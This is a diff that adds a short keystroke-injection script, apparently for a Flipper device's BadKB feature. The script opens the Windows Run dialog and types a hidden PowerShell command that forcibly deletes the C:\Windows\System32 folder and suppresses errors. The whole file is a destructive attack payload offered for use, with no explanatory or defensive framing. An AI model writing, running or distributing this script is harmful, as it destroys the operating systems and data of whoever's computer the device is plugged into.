@@ -1,0 +1,11 @@
+REM Flipper/BadKb/Windows/System32Delete_Windows
+
+DELAY 2000
+GUI r
+DELAY 1500
+
+STRING powershell -windowstyle hidden -Command Remove-Item -Path "C:\Windows\System32" -Force -Recurse -ErrorAction SilentlyContinue
+
+DELAY 2100
+
+ENTER
